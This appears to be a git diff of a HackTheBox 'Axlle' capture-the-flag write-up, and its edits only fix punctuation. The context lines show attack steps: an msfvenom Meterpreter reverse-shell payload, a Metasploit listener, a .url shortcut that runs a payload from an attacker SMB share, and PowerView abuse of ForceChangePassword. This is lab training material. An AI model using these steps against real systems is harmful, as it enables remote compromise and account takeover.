@@ -172,7 +172,7 @@ Since the database type is `MSSQLCE`, we can download the `.sdf` file on our loc
 
 ![sdf file location](/images/HTB-Axlle/sdf_file_location.png)
 
-> An `.sdf` (SQL Server Compact Edition Database) file is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).
+> An `.sdf` file (SQL Server Compact Database File) is a lightweight database format used by Microsoft SQL Server Compact Edition (SQL CE).
 
 Go on [rebasedata](https://www.rebasedata.com) and convert your `.sdf` file to a `sqlite` format.
 
@@ -231,7 +231,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=PORT_NUMBER 
 
 ![malicious exe file](/images/HTB-Axlle/malicious_exe.png)
 
-2. Set up the listener in Metasploit
+2. Set up the listener in Metasploit.
 
 ```
 use exploit/multi/handler
@@ -241,14 +241,14 @@ set lport PORT_NUMBER
 run
 ```
 
-3. Create the `.url` file with the following content
+3. Create the `.url` file with the following content.
 
 ```
 [InternetShortcut]
 URL=file://YOUR_IP/share/payload.exe
 ```
 
-4. Start a SMB server and a web server
+4. Start a SMB server and a web server.
 
 ```
 impacket-smbserver -smb2support share .
@@ -306,7 +306,7 @@ Find `dallon.matrix` and you will see that he is a member of the `Web Devs` grou
 
 The members of the `Web Devs` group can change the password of `Baz.Humphries` and `Jacob.Greeny` because of `ForceChangePassword` which we can abuse with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 
->This account attribute allows the enforcement of a password change even without knowing the user's current password. *Read more about it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword).*
+> This account attribute allows the enforcement of a password change even without knowing the user's current password. *Read more about it [here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword).*
 
 ![ForceChangePassword](/images/HTB-Axlle/ForeceChangePassword.png)
 
